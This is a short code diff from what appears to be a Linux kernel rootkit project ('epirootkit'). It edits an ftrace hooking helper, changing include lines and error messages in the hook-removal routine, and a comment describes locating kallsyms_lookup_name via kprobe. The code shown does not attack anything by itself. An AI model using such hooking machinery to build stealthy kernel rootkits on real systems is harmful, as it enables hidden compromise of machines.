@@ -1,9 +1,4 @@
-#include "ftrace_helper.h"
-
-#include <linux/kallsyms.h>
-#include <linux/kprobes.h>
-#include <linux/slab.h>
-#include <linux/uaccess.h>
+#include "epirootkit.h"
 
 /**
  * @brief Retrieve the address of kallsyms_lookup_name via kprobe.
@@ -107,13 +102,13 @@ void fh_remove_hook(struct ftrace_hook *hook)
 
     err = unregister_ftrace_function(&hook->ops);
     if (err) 
-		pr_err("ftrace_helper: unregister_ftrace_function() failed: %d\n");
+		pr_err("ftrace_helper: unregister_ftrace_function() failed.\n");
 	else
 		pr_info("ftrace_helper: unregister_ftrace_function() succeeded\n");
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
     if (err) 
-		pr_err("ftrace_helper: ftrace_set_filter_ip() failed: %d\n");
+		pr_err("ftrace_helper: ftrace_set_filter_ip() failed. \n");
 	else
 		pr_info("ftrace_helper: ftrace_set_filter_ip() succeeded\n");
 }
